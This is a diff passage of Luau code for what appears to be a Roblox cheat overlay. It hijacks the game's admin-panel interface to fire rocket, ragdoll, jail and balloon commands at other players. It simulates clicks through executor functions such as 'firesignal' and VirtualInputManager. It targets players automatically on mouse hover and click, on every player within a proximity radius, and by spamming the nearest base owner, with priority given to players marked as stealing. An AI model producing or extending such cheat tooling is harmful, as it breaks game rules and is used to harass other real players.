+    blListScroll.Size = UDim2.new(1, 0, 1, -34)
+    blListScroll.Position = UDim2.new(0, 0, 0, 32)
+    blListScroll.BackgroundTransparency = 1
+    blListScroll.BorderSizePixel = 0
+    blListScroll.ScrollBarThickness = 0
+    blListScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 40, 40)
+    local blListLayout = Instance.new("UIListLayout", blListScroll)
+    blListLayout.Padding = UDim.new(0, 4)
+    blListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    blListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        blListScroll.CanvasSize = UDim2.new(0, 0, 0, blListLayout.AbsoluteContentSize.Y + 4)
+    end)
+
+    local function rebuildBlList()
+        for _, c in ipairs(blListScroll:GetChildren()) do
+            if not c:IsA("UIListLayout") then c:Destroy() end
+        end
+        for i, name in ipairs(BlacklistedPlayers) do
+            local row = Instance.new("Frame", blListScroll)
+            row.LayoutOrder = i
+            row.Size = UDim2.new(1, 0, 0, 28)
+            row.BackgroundColor3 = Color3.fromRGB(28, 18, 18)
+            row.BorderSizePixel = 0
+            Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
+            local rowStroke = Instance.new("UIStroke", row)
+            rowStroke.Color = Color3.fromRGB(80, 30, 30)
+            rowStroke.Thickness = 1
+            rowStroke.Transparency = 0.5
+
+            local nameLabel = Instance.new("TextLabel", row)
+            nameLabel.Size = UDim2.new(1, -36, 1, 0)
+            nameLabel.Position = UDim2.new(0, 10, 0, 0)
+            nameLabel.BackgroundTransparency = 1
+            nameLabel.Text = name
+            nameLabel.Font = Enum.Font.GothamBold
+            nameLabel.TextSize = 11
+            nameLabel.TextColor3 = Color3.fromRGB(230, 180, 180)
+            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+            local removeBtn = Instance.new("TextButton", row)
+            removeBtn.Size = UDim2.new(0, 26, 0, 20)
+            removeBtn.Position = UDim2.new(1, -30, 0.5, -10)
+            removeBtn.BackgroundColor3 = Color3.fromRGB(100, 25, 25)
+            removeBtn.Text = "X"
+            removeBtn.Font = Enum.Font.GothamBold
+            removeBtn.TextSize = 10
+            removeBtn.TextColor3 = Color3.fromRGB(255, 160, 160)
+            removeBtn.AutoButtonColor = false
+            Instance.new("UICorner", removeBtn).CornerRadius = UDim.new(0, 4)
+
+            local capName = name
+            removeBtn.MouseButton1Click:Connect(function()
+                for j, n in ipairs(BlacklistedPlayers) do
+                    if n:lower() == capName:lower() then
+                        table.remove(BlacklistedPlayers, j)
+                        break
+                    end
+                end
+                Config.Blacklist = BlacklistedPlayers
+        SaveConfig()
+                rebuildBlList()
+                if refreshBlacklistUI then refreshBlacklistUI() end
+                ShowNotification("BLACKLIST", "Removed " .. capName)
+            end)
+        end
+        blListScroll.CanvasSize = UDim2.new(0, 0, 0, blListLayout.AbsoluteContentSize.Y + 4)
+    end
+
+    local function addBlacklistUser(username)
+        username = username:match("^%s*(.-)%s*$")
+        if username == "" then return end
+        local lower = username:lower()
+        for _, n in ipairs(BlacklistedPlayers) do
+            if n:lower() == lower then
+                ShowNotification("BLACKLIST", username .. " is already blacklisted")
+                return
+            end
+        end
+        table.insert(BlacklistedPlayers, username)
+        Config.Blacklist = BlacklistedPlayers
+        SaveConfig()
+        rebuildBlList()
+        if refreshBlacklistUI then refreshBlacklistUI() end
+        blInput.Text = ""
+        ShowNotification("BLACKLIST", "Blacklisted: " .. username)
+    end
+
+    blAddBtn.MouseButton1Click:Connect(function()
+        addBlacklistUser(blInput.Text)
+    end)
+    blInput.FocusLost:Connect(function(enterPressed)
+        if enterPressed then addBlacklistUser(blInput.Text) end
+    end)
+
+    rebuildBlList()
+
+    -- â”€â”€ Player list (PLAYERS tab) â”€â”€
+    listFrame = Instance.new("ScrollingFrame", frame)
+    listFrame.Size = UDim2.new(1, -20, 1, -144)
+    listFrame.Position = UDim2.new(0, 10, 0, 142)
+    listFrame.BackgroundTransparency = 1
+    listFrame.BorderSizePixel = 0
+    listFrame.ScrollBarThickness = 0
+    listFrame.ScrollBarImageColor3 = Theme.Accent1
+    layout = Instance.new("UIListLayout", listFrame)
+    layout.Padding = UDim.new(0, 10)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    -- Set initial tab state now that both listFrame and blFrame exist
+    setActiveTab("players")
+
+    local function getAdminPanelSortKey(plr)
+        if not plr or not plr.Parent then return 3, 9999, "" end
+        local stealing = plr:GetAttribute("Stealing")
+        local brainrotName = plr:GetAttribute("StealingIndex")
+        if not stealing then
+            return 3, 9999, plr.Name or ""
+        end
+        if brainrotName then
+            for i, pName in ipairs(PRIORITY_LIST) do
+                if pName == brainrotName then
+                    return 1, i, plr.Name or ""
+                end
+            end
+            return 2, 9999, plr.Name or ""
+        end
+        return 2, 9999, plr.Name or ""
+    end
+
+    local function sortAdminPanelList()
+        local rows = {}
+        for _, child in ipairs(listFrame:GetChildren()) do
+            if child:IsA("TextButton") and child.Name ~= "" then
+                local plr = Players:FindFirstChild(child.Name)
+                if plr then
+                    table.insert(rows, {row = child, plr = plr})
+                end
+            end
+        end
+        table.sort(rows, function(a, b)
+            local t1, p1, n1 = getAdminPanelSortKey(a.plr)
+            local t2, p2, n2 = getAdminPanelSortKey(b.plr)
+            if t1 ~= t2 then return t1 < t2 end
+            if p1 ~= p2 then return p1 < p2 end
+            return (n1 or "") < (n2 or "")
+        end)
+        for i, entry in ipairs(rows) do
+            entry.row.LayoutOrder = i
+        end
+    end
+
+    local function fireClick(button)
+        if button then
+            if firesignal then
+                firesignal(button.MouseButton1Click); firesignal(button.MouseButton1Down); firesignal(button.Activated)
+            else
+                local x = button.AbsolutePosition.X + (button.AbsoluteSize.X / 2)
+                local y = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + 58
+                VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+                VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+            end
+        end
+    end
+    _G.fireClick = fireClick
+
+    local function runAdminCommand(targetPlayer, commandName)
+        if targetPlayer and isBlacklisted(targetPlayer.Name) then return false end
+        local realAdminGui = PlayerGui:WaitForChild("AdminPanel", 5)
+        if not realAdminGui then return false end
+        local contentScroll = realAdminGui.AdminPanel:WaitForChild("Content"):WaitForChild("ScrollingFrame")
+        local cmdBtn = contentScroll:FindFirstChild(commandName)
+        if not cmdBtn then return false end
+        fireClick(cmdBtn)
+        task.wait(0.05)
+        local profilesScroll = realAdminGui:WaitForChild("AdminPanel"):WaitForChild("Profiles"):WaitForChild("ScrollingFrame")
+        local playerBtn = profilesScroll:FindFirstChild(targetPlayer.Name)
+        if not playerBtn then return false end
+        fireClick(playerBtn)
+        return true
+    end
+    
+    _G.runAdminCommand = runAdminCommand
+
+local isOnCooldown
+
+local function getNextAvailableCommand()
+    local priorityCommands = {"ragdoll", "balloon", "rocket", "jail"}
+    local otherCommands = {}
+    
+    for _, cmd in ipairs(ALL_COMMANDS) do
+        local isPriority = false
+        for _, priorityCmd in ipairs(priorityCommands) do
+            if cmd == priorityCmd then
+                isPriority = true
+                break
+            end
+        end
+        if not isPriority then
+            table.insert(otherCommands, cmd)
+        end
+    end
+
+    for _, cmd in ipairs(priorityCommands) do
+        if not isOnCooldown(cmd) then
+            return cmd
+        end
+    end
+
+    for _, cmd in ipairs(otherCommands) do
+        if not isOnCooldown(cmd) then
+            return cmd
+        end
+    end
+
+    return nil
+end
+
+isOnCooldown = function(cmd)
+    local adminGui = PlayerGui:FindFirstChild("AdminPanel")
+    if adminGui then
+        local content = adminGui:FindFirstChild("AdminPanel")
+        if content then
+            local scrollFrame = content:FindFirstChild("Content")
+            if scrollFrame then
+                local scrollingFrame = scrollFrame:FindFirstChild("ScrollingFrame")
+                if scrollingFrame then
+                    local cmdButton = scrollingFrame:FindFirstChild(cmd)
+                    if cmdButton then
+                        local timerLabel = cmdButton:FindFirstChild("Timer")
+                        if timerLabel then
+                            return timerLabel.Visible
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    if not activeCooldowns[cmd] then return false end
+    return (tick() - activeCooldowns[cmd]) < (COOLDOWNS[cmd] or 0)
+end
+
+    local function setGlobalVisualCooldown(cmd)
+        if SharedState.AdminButtonCache[cmd] then
+            for _, b in ipairs(SharedState.AdminButtonCache[cmd]) do
+                if b and b.Parent then
+                    b.BackgroundColor3 = Theme.Error
+                    task.delay(COOLDOWNS[cmd] or 5, function()
+                        if b and b.Parent then
+                            local hasBallooned = (cmd == "balloon" and SharedState.BalloonedPlayers and next(SharedState.BalloonedPlayers) ~= nil)
+                            b.BackgroundColor3 = hasBallooned and Theme.Error or Theme.SurfaceHighlight
+                        end
+                    end)
+                end
+            end
+        end
+    end
+
+    local function updateBalloonButtons()
+        local hasBallooned = false
+        for _, _ in pairs(SharedState.BalloonedPlayers) do
+            hasBallooned = true
+            break
+        end
+        if SharedState.AdminButtonCache and SharedState.AdminButtonCache["balloon"] then
+            for _, b in ipairs(SharedState.AdminButtonCache["balloon"]) do
+                if b and b.Parent then
+                    b.BackgroundColor3 = hasBallooned and Theme.Error or Theme.SurfaceHighlight
+                end
+            end
+        end
+    end
+
+    local function triggerAll(plr)
+        if not canUseAdminAction(plr) then return end
+        local count = 0
+        for _, cmd in ipairs(ALL_COMMANDS) do
+            if not isOnCooldown(cmd) then
+                task.delay(count * 0.1, function()
+                    if runAdminCommand(plr, cmd) then
+                        activeCooldowns[cmd] = tick()
+                        setGlobalVisualCooldown(cmd)
+                        if cmd == "balloon" then
+                            SharedState.BalloonedPlayers[plr.UserId] = true
+                            updateBalloonButtons()
+                        end
+                    end
+                end)
+                count = count + 1
+            end
+        end
+    end
+
+    local function rayToCubeIntersect(rayOrigin, rayDirection, cubeCenter, cubeSize)
+        local halfSize = cubeSize / 2
+        local minBounds = cubeCenter - Vector3.new(halfSize, halfSize, halfSize)
+        local maxBounds = cubeCenter + Vector3.new(halfSize, halfSize, halfSize)
+        
+        if rayDirection.X == 0 then rayDirection = Vector3.new(0.0001, rayDirection.Y, rayDirection.Z) end
+        if rayDirection.Y == 0 then rayDirection = Vector3.new(rayDirection.X, 0.0001, rayDirection.Z) end
+        if rayDirection.Z == 0 then rayDirection = Vector3.new(rayDirection.X, rayDirection.Y, 0.0001) end
+        
+        local tmin = (minBounds.X - rayOrigin.X) / rayDirection.X
+        local tmax = (maxBounds.X - rayOrigin.X) / rayDirection.X
+        if tmin > tmax then tmin, tmax = tmax, tmin end
+        
+        local tymin = (minBounds.Y - rayOrigin.Y) / rayDirection.Y
+        local tymax = (maxBounds.Y - rayOrigin.Y) / rayDirection.Y
+        if tymin > tymax then tymin, tymax = tymax, tymin end
+        
+        if tmin > tymax or tymin > tmax then return false end
+        if tymin > tmin then tmin = tymin end
+        if tymax < tmax then tmax = tymax end
+        
+        local tzmin = (minBounds.Z - rayOrigin.Z) / rayDirection.Z
+        local tzmax = (maxBounds.Z - rayOrigin.Z) / rayDirection.Z
+        if tzmin > tzmax then tzmin, tzmax = tzmax, tzmin end
+        
+        if tmin > tzmax or tzmin > tmax then return false end
+        
+        return true
+    end
+
+    local _hlParent = PlayerGui
+    pcall(function() _hlParent = game:GetService("CoreGui") end)
+    local highlight = Instance.new("Highlight", _hlParent)
+   highlight.FillColor = Color3.fromRGB(255, 50, 50)
+    highlight.FillTransparency = 0.3
+    highlight.OutlineColor = Color3.fromRGB(255, 50, 50)
+    highlight.OutlineTransparency = 0
+    highlight.Adornee = nil
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+
+    RunService.RenderStepped:Connect(function()
+        if Config.ClickToAP then
+            local camera = Workspace.CurrentCamera
+            local mousePos = UserInputService:GetMouseLocation()
+            local ray = camera:ViewportPointToRay(mousePos.X, mousePos.Y)
+            
+            local hitboxSize = 8
+            local bestPlayer = nil
+            local bestDistance = math.huge
+            
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Parent then
+                    local hrp = p.Character.HumanoidRootPart
+                    local cubeCenter = hrp.Position
+                    
+                    if rayToCubeIntersect(ray.Origin, ray.Direction, cubeCenter, hitboxSize) then
+                        local distance = (ray.Origin - cubeCenter).Magnitude
+                        if distance < bestDistance then
+                            bestDistance = distance
+                            bestPlayer = p
+                        end
+                    end
+                end
+            end
+            
+            local newAdornee = bestPlayer and bestPlayer.Character or nil
+            if highlight.Adornee ~= newAdornee then
+                highlight.Adornee = newAdornee
+        for _, child in ipairs(listFrame:GetChildren()) do
+            if child:IsA("TextButton") then
+                local stroke = child:FindFirstChildOfClass("UIStroke")
+                if stroke then
+                    local hoveredName = newAdornee and newAdornee.Parent and Players:GetPlayerFromCharacter(newAdornee.Parent) and Players:GetPlayerFromCharacter(newAdornee.Parent).Name or ""
+                    if newAdornee and child.Name == hoveredName then
+                        stroke.Color = Color3.fromRGB(255, 50, 50)
+                        stroke.Transparency = 0
+                        child.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
+                    else
+                        stroke.Color = Theme.Accent2
+                        stroke.Transparency = 0.7
+                        child.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+                    end
+                end
+            end
+        end            end
+        else
+            highlight.Adornee = nil
+        end
+    end)
+
+    UserInputService.InputBegan:Connect(function(inp, g)
+        if not g and inp.UserInputType == Enum.UserInputType.MouseButton1 and Config.ClickToAP then
+            local camera = Workspace.CurrentCamera
+            local mousePos = UserInputService:GetMouseLocation()
+            local ray = camera:ViewportPointToRay(mousePos.X, mousePos.Y)
+            
+            local hitboxSize = 8
+            local bestPlayer = nil
+            local bestDistance = math.huge
+            
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Parent then
+                    local hrp = p.Character.HumanoidRootPart
+                    local cubeCenter = hrp.Position
+                    
+                    if rayToCubeIntersect(ray.Origin, ray.Direction, cubeCenter, hitboxSize) then
+                        local distance = (ray.Origin - cubeCenter).Magnitude
+                        if distance < bestDistance then
+                            bestDistance = distance
+                            bestPlayer = p
+                        end
+                    end
+                end
+            end
+            
+            if bestPlayer then
+                if isBlacklisted(bestPlayer.Name) then
+                    ShowNotification("CLICK TO AP", bestPlayer.Name .. " is blacklisted")
+                    return
+                end
+                
+                local hasAnyAvailable = false
+                for _, cmd in ipairs(ALL_COMMANDS) do
+                    if not isOnCooldown(cmd) then
+                        hasAnyAvailable = true
+                        break
+                    end
+                end
+                if hasAnyAvailable then
+                    if Config.ClickToAPSingleCommand then
+                        local nextCmd = getNextAvailableCommand()
+                        if nextCmd then
+                            if runAdminCommand(bestPlayer, nextCmd) then
+                                activeCooldowns[nextCmd] = tick()
+                                setGlobalVisualCooldown(nextCmd)
+                                if nextCmd == "balloon" then
+                                    SharedState.BalloonedPlayers[bestPlayer.UserId] = true
+                                    updateBalloonButtons()
+                                end
+                                ShowNotification("CLICK AP", "Sent " .. nextCmd .. " to " .. bestPlayer.Name)
+                            else
+                                ShowNotification("CLICK AP", "Failed to send " .. nextCmd .. " to " .. bestPlayer.Name)
+                            end
+                        else
+                            ShowNotification("CLICK AP", "All commands on cooldown")
+                        end
+                    else
+                        triggerAll(bestPlayer)
+                        ShowNotification("CLICK AP", "Triggered on " .. bestPlayer.Name)
+                    end
+                else
+                    local realAdminGui = PlayerGui:WaitForChild("AdminPanel", 5)
+                    if realAdminGui then
+                        local profilesScroll = realAdminGui:WaitForChild("AdminPanel"):WaitForChild("Profiles"):WaitForChild("ScrollingFrame")
+                        local playerBtn = profilesScroll:FindFirstChild(bestPlayer.Name)
+                        if playerBtn then
+                            fireClick(playerBtn)
+                            ShowNotification("CLICK AP", "Selected " .. bestPlayer.Name)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            task.wait(0.2)
+            if ProximityAPActive then
+                local myChar = LocalPlayer.Character
+                if myChar and myChar:FindFirstChild("HumanoidRootPart") then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                            local dist = (p.Character.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude
+                            if dist <= Config.ProximityRange then
+                                if isBlacklisted(p.Name) then
+                                    -- skip proximity AP 
+                                else
+                                    local hasAnyAvailable = false
+                                    for _, cmd in ipairs(ALL_COMMANDS) do
+                                        if not isOnCooldown(cmd) then
+                                            hasAnyAvailable = true
+                                            break
+                                        end
+                                    end
+                                    if hasAnyAvailable then
+                                        triggerAll(p)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    local function createPlayerRow(plr)
+        local row = Instance.new("TextButton") 
+        row.Name = plr.Name
+        row.LayoutOrder = 0
+        row.Size = UDim2.new(1, -4, 0, 74)
+        row.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+        row.BackgroundTransparency = 0.2
+        row.BorderSizePixel = 0
+        row.AutoButtonColor = false
+        row.Text = ""
+        row.Parent = listFrame
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)
+        local rowStroke = Instance.new("UIStroke", row)
+        rowStroke.Color = Theme.Accent2
+        rowStroke.Thickness = 1.5
+        rowStroke.Transparency = 0.7
+        
+        row.MouseEnter:Connect(function()
+            row.BackgroundTransparency = 0.05
+            rowStroke.Transparency = 0.4
+            rowStroke.Color = Theme.Accent1
+        end)
+        row.MouseLeave:Connect(function()
+            row.BackgroundTransparency = 0.2
+            rowStroke.Transparency = 0.7
+            rowStroke.Color = Theme.Accent2
+        end)
+
+        local headshot = Instance.new("ImageLabel", row)
+        headshot.Size = UDim2.new(0, 42, 0, 42)
+        headshot.Position = UDim2.new(0, 12, 0.5, -21)
+        headshot.BackgroundColor3 = Color3.fromRGB(15, 17, 22)
+        headshot.Image = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+        Instance.new("UICorner", headshot).CornerRadius = UDim.new(1, 0)
+        local headshotStroke = Instance.new("UIStroke", headshot)
+        headshotStroke.Color = Theme.Accent1
+        headshotStroke.Thickness = 2.5
+        headshotStroke.Transparency = 0.2
+        
+        local dName = Instance.new("TextLabel", row)
+    dName.Size = UDim2.new(0, 160, 0, 20); dName.Position = UDim2.new(0, 58, 0, 10)
+    dName.BackgroundTransparency = 1; dName.Text = plr.Name
+    dName.Font = Enum.Font.GothamBold; dName.TextSize = 14
+    dName.TextColor3 = Theme.TextPrimary; dName.TextXAlignment = Enum.TextXAlignment.Left
+
+        local uName = Instance.new("TextLabel", row)
+    uName.Size = UDim2.new(0, 160, 0, 16); uName.Position = UDim2.new(0, 58, 0, 30)
+    uName.BackgroundTransparency = 1; uName.Text = plr.DisplayName
+    uName.Font = Enum.Font.GothamBold; uName.TextSize = 10
+    uName.TextColor3 = Color3.fromRGB(210, 210, 210); uName.TextXAlignment = Enum.TextXAlignment.Left
+
+    local apToolLbl = Instance.new("TextLabel", row)
+    apToolLbl.Name = "APToolLabel"
+    apToolLbl.Size = UDim2.new(0, 160, 0, 14); apToolLbl.Position = UDim2.new(0, 58, 0, 44)
+    apToolLbl.BackgroundTransparency = 1
+    apToolLbl.Font = Enum.Font.GothamMedium; apToolLbl.TextSize = 10
+    apToolLbl.TextColor3 = Color3.fromRGB(185, 185, 185); apToolLbl.TextXAlignment = Enum.TextXAlignment.Left
+    do
+        local ht = nil
+        local c = plr.Character
+        if c then for _, o in ipairs(c:GetChildren()) do if o:IsA("Tool") then ht = o.Name break end end end
+        apToolLbl.Text = ht or ""
+        if ht and DANGER_TOOLS[ht] then
+            dName.TextColor3 = Color3.fromRGB(180, 180, 180)
+        end
+    end
+
+        local nearestBrainrotName = plr:GetAttribute("StealingIndex")
+        
+        local stealing = plr:GetAttribute("Stealing")
+        if stealing then
+            if nearestBrainrotName then
+                uName.Text = nearestBrainrotName
+                uName.TextColor3 = Color3.fromRGB(210, 210, 210)
+                uName.Font = Enum.Font.GothamBlack
+                uName.TextSize = 14
+            else
+                uName.Text = "STEALING"
+                uName.TextColor3 = Color3.fromRGB(200, 200, 200)
+                uName.Font = Enum.Font.GothamBlack
+                uName.TextSize = 14
+            end
+        end
+        
+        task.spawn(function()
+            while row.Parent do
+                task.wait(0.5)
+                
+                if not plr or not plr.Parent or not Players:FindFirstChild(plr.Name) then
+                    removePlayer(plr)
+                    break
+                end
+                
+                local stealing = plr:GetAttribute("Stealing")
+                nearestBrainrotName = plr:GetAttribute("StealingIndex")
+                
+                if stealing then
+                    if nearestBrainrotName then
+                        uName.Text = nearestBrainrotName
+                        uName.TextColor3 = Color3.fromRGB(210, 210, 210)
+                        uName.Font = Enum.Font.GothamBold
+                        uName.TextSize = 11
+                    else
+                        uName.Text = "âš ï¸ STEALING"
+                        uName.TextColor3 = Color3.fromRGB(200, 200, 200)
+                        uName.Font = Enum.Font.GothamBold
+                        uName.TextSize = 11
+                    end
+                else
+                    uName.Text = "(@" .. plr.Name .. ")"
+                    uName.TextColor3 = Theme.TextSecondary
+                    uName.Font = Enum.Font.GothamMedium
+                    uName.TextSize = 7
+                    nearestBrainrotName = nil
+                end
+                -- Update held tool label
+                pcall(function()
+                    local ht = nil
+                    local c = plr.Character
+                    if c then for _, o in ipairs(c:GetChildren()) do if o:IsA("Tool") then ht = o.Name break end end end
+                    apToolLbl.Text = ht or ""
+                    if ht and DANGER_TOOLS[ht] then
+                        dName.TextColor3 = Color3.fromRGB(180, 180, 180)
+                    else
+                        dName.TextColor3 = Theme.TextPrimary
+                    end
+                end)
+            end
+        end)
+
+        local btnCont = Instance.new("Frame", row)
+    btnCont.Size = UDim2.new(0, 250, 1, 0); btnCont.Position = UDim2.new(1, -255, 0, 0)
+    btnCont.BackgroundTransparency = 1; btnCont.ZIndex = 10
+
+        local buttonsDef = {
+            {icon = "RKT", cmd = "rocket"},
+            {icon = "RAG", cmd = "ragdoll"},
+            {icon = "JAIL", cmd = "jail"},
+            {icon = "BAL", cmd = "balloon"}
+        }
+
+        -- Click-to-AP toggle button (sits left of the 4 cmd buttons)
+        local ctapBtn = Instance.new("TextButton", btnCont)
+        ctapBtn.Size = UDim2.new(0, 30, 0, 30)
+        ctapBtn.Position = UDim2.new(0, 4, 0.5, -15)
+        ctapBtn.AutoButtonColor = false
+        ctapBtn.Text = "AP"
+        ctapBtn.TextSize = 9
+        ctapBtn.Font = Enum.Font.GothamBlack
+        ctapBtn.TextColor3 = Theme.TextPrimary
+        ctapBtn.ZIndex = 11
+        ctapBtn.Active = true
+        ctapBtn.BackgroundColor3 = Config.ClickToAP and Theme.Accent1 or Color3.fromRGB(35, 37, 43)
+        ctapBtn.TextColor3 = Config.ClickToAP and Color3.new(0, 0, 0) or Theme.TextPrimary
+        ctapBtn.BackgroundTransparency = 0
+        Instance.new("UICorner", ctapBtn).CornerRadius = UDim.new(0, 8)
+        local ctapStroke = Instance.new("UIStroke", ctapBtn)
+        ctapStroke.Color = Config.ClickToAP and Theme.Accent1 or Color3.fromRGB(70, 70, 80)
+        ctapStroke.Thickness = 1.5
+        ctapStroke.Transparency = 0.4
+        ctapStroke.ZIndex = 12
+        ctapBtn.MouseButton1Click:Connect(function()
+            Config.ClickToAP = not Config.ClickToAP
+            SaveConfig()
+            ctapBtn.BackgroundColor3 = Config.ClickToAP and Theme.Accent1 or Color3.fromRGB(35, 37, 43)
+            ctapBtn.TextColor3 = Config.ClickToAP and Color3.new(0, 0, 0) or Theme.TextPrimary
+            ctapStroke.Color = Config.ClickToAP and Theme.Accent1 or Color3.fromRGB(70, 70, 80)
+        end)
+
+        for i, def in ipairs(buttonsDef) do
+            local b = Instance.new("TextButton", btnCont)
+            b.Size = UDim2.new(0, 30, 0, 30)
+            b.Position = UDim2.new(0, 38 + (i-1)*34, 0.5, -15)
+            b.AutoButtonColor = false
+            b.Text = def.icon
+            b.TextSize = 9
+            b.TextColor3 = Theme.TextPrimary
+            b.Font = Enum.Font.GothamBlack
+            b.ZIndex = 11
+            b.Active = true
+            local hasBallooned = SharedState.BalloonedPlayers and next(SharedState.BalloonedPlayers) ~= nil
+            local isOnCD = isOnCooldown(def.cmd)
+            b.BackgroundColor3 = (def.cmd == "balloon" and hasBallooned) or isOnCD and Theme.Error or Color3.fromRGB(35, 37, 43)
+            b.BackgroundTransparency = 0
+            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+            local bStroke = Instance.new("UIStroke", b)
+            bStroke.Color = (def.cmd == "balloon" and hasBallooned) or isOnCD and Theme.Error or Color3.fromRGB(70, 70, 80)
+            bStroke.Thickness = 1.5
+            bStroke.Transparency = 0.4
+            bStroke.ZIndex = 12
+            
+            b.MouseEnter:Connect(function()
+                if not isOnCD and not (def.cmd == "balloon" and hasBallooned) then
+                    b.BackgroundColor3 = Color3.fromRGB(45, 47, 53)
+                    bStroke.Transparency = 0.2
+                end
+            end)
+            b.MouseLeave:Connect(function()
+                if not isOnCD and not (def.cmd == "balloon" and hasBallooned) then
+                    b.BackgroundColor3 = Color3.fromRGB(35, 37, 43)
+                    bStroke.Transparency = 0.4
+                end
+            end)
+            
+            if not SharedState.AdminButtonCache[def.cmd] then SharedState.AdminButtonCache[def.cmd] = {} end
+            table.insert(SharedState.AdminButtonCache[def.cmd], b)
+
+            task.spawn(function()
+                while b and b.Parent do
+                    task.wait(0.5)
+                    if not b.Text or b.Text == "" or b.Text == "BUTTON" or b.Text == "Button" then
+                        b.Text = def.icon
+                        b.TextSize = 9
+                        b.TextColor3 = Theme.TextPrimary
+                        b.Font = Enum.Font.GothamBlack
+                    end
+                    local cd = isOnCooldown(def.cmd)
+                    local balloon = (def.cmd == "balloon" and SharedState.BalloonedPlayers and next(SharedState.BalloonedPlayers) ~= nil)
+                    if cd or balloon then
+                        b.BackgroundColor3 = Theme.Error
+                        b.BackgroundTransparency = 0
+                        bStroke.Color = Theme.Error
+                        bStroke.Transparency = 0.2
+                        if b.Text ~= def.icon then
+                            b.Text = def.icon
+                            b.TextSize = 9
+                            b.TextColor3 = Theme.TextPrimary
+                            b.Font = Enum.Font.GothamBlack
+                        end
+                    elseif not cd and not balloon then
+                        b.BackgroundColor3 = Color3.fromRGB(35, 37, 43)
+                        b.BackgroundTransparency = 0
+                        bStroke.Color = Color3.fromRGB(70, 70, 80)
+                        bStroke.Transparency = 0.4
+                        if b.Text ~= def.icon then
+                            b.Text = def.icon
+                            b.TextSize = 9
+                            b.TextColor3 = Theme.TextPrimary
+                            b.Font = Enum.Font.GothamBlack
+                        end
+                    end
+                end
+            end)
+
+            b.MouseButton1Click:Connect(function()
+                if def.special and def.cmd == "spambaseowner" then
+                    local char = LocalPlayer.Character
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if not hrp then return end
+                    
+                    local closestPlot = nil
+                    local closestDist = math.huge
+                    
+                    local plots = Workspace:FindFirstChild("Plots")
+                    if plots then
+                        for _, plot in ipairs(plots:GetChildren()) do
+                            local plotPos = plot:FindFirstChild("Base") and plot.Base:FindFirstChild("Spawn")
+                            if plotPos then
+                                local dist = (hrp.Position - plotPos.Position).Magnitude
+                                if dist < closestDist then
+                                    closestDist = dist
+                                    closestPlot = plot
+                                end
+                            end
+                        end
+                    end
+                    
+                    if closestPlot then
+                        task.spawn(function()
+                            local Packages = ReplicatedStorage:WaitForChild("Packages")
+                            local Synchronizer = require(Packages:WaitForChild("Synchronizer"))
+                            local channel = Synchronizer:Get(closestPlot.Name)
+                            if channel then
+                                local owner = channel:Get("Owner")
+                                local targetPlayer = nil
+                                if typeof(owner) == "Instance" and owner:IsA("Player") then
+                                    targetPlayer = owner
+                                elseif typeof(owner) == "table" and owner.UserId then
+                                    targetPlayer = Players:GetPlayerByUserId(owner.UserId)
+                                end
+                                
+                                if targetPlayer and targetPlayer ~= LocalPlayer then
+                                    local hasAnyAvailable = false
+                                    for _, cmd in ipairs(ALL_COMMANDS) do
+                                        if not isOnCooldown(cmd) then
+                                            hasAnyAvailable = true
+                                            break
+                                        end
+                                    end
+                                    if hasAnyAvailable then
+                                        triggerAll(targetPlayer)
+                                        ShowNotification("AP SPAM", "Spamming " .. targetPlayer.Name)
+                                    else
+                                        ShowNotification("AP SPAM", "All commands on cooldown")
+                                    end
+                                else
+                                    ShowNotification("AP SPAM", "No owner found")
+                                end
+                            end
+                        end)
+                    end
+                else
+                    if isBlacklisted(plr.Name) then
+                        ShowNotification("ADMIN", plr.Name .. " is blacklisted")
+                        return
+                    end
+                    ShowNotification("ADMIN", "Attempting " .. def.cmd .. " on " .. plr.Name)
+                    if runAdminCommand(plr, def.cmd) then
+                        activeCooldowns[def.cmd] = tick()
+                        setGlobalVisualCooldown(def.cmd)
+                        if def.cmd == "balloon" then
+                            SharedState.BalloonedPlayers[plr.UserId] = true
+                            for _, btn in ipairs(SharedState.AdminButtonCache["balloon"] or {}) do
+                                if btn and btn.Parent then btn.BackgroundColor3 = Theme.Error end
+                            end
+                        end
+                        ShowNotification("ADMIN", "Sent " .. def.cmd .. " to " .. plr.Name)
+                    else
+                        ShowNotification("ADMIN", "Failed to send " .. def.cmd .. " to " .. plr.Name)
+                    end
+                end
+            end)
+        end
+
+        -- â”€â”€ Quick Blacklist button (red X) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        local blQuickBtn = Instance.new("TextButton", btnCont)
+        blQuickBtn.Size = UDim2.new(0, 30, 0, 30)
+        blQuickBtn.Position = UDim2.new(0, 38 + (#buttonsDef) * 34, 0.5, -15)
+        blQuickBtn.AutoButtonColor = false
+        blQuickBtn.Text = "X"
